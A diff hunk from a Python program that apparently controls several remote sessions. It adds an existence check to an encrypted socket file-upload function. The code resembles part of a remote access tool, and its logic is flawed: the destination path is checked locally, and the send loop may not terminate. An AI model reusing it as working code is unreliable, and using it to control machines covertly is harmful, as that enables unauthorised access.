@@ -178,21 +178,24 @@ def download(from_, where, session):            #ENCRYPTION DONE!
         print("\n[*] It looks like the path you entered is not path.Double check it please")
 
 def upload(what, where, session):
-    socket = connections[session]['socket']
-    socket.send(where.encode())
-    time.sleep(0.3)
-    file_name = what.split('\\')[-1]
-    socket.send(file_name.encode())
-    file = open(what, 'rb')
-    a = file.read(4096)
-    a = ciper.encrypt(a)
-    while a:
-        socket.send(a)
+    if os.path.isfile(what) and os.path.isdir(where):
+        socket = connections[session]['socket']
+        socket.send(where.encode())
+        time.sleep(0.3)
+        file_name = what.split('\\')[-1]
+        socket.send(file_name.encode())
+        file = open(what, 'rb')
         a = file.read(4096)
         a = ciper.encrypt(a)
-    time.sleep(1)
-    socket.send(ciper.encrypt(b"\n\r"))
-    file.close()
+        while a:
+            socket.send(a)
+            a = file.read(4096)
+            a = ciper.encrypt(a)
+        time.sleep(1)
+        socket.send(ciper.encrypt(b"\n\r"))
+        file.close()
+    else:
+        print("\n[*] It looks like the path you entered is not path.Double check it please")
 
 def log(log):
     with open('example.log', 'a') as f:
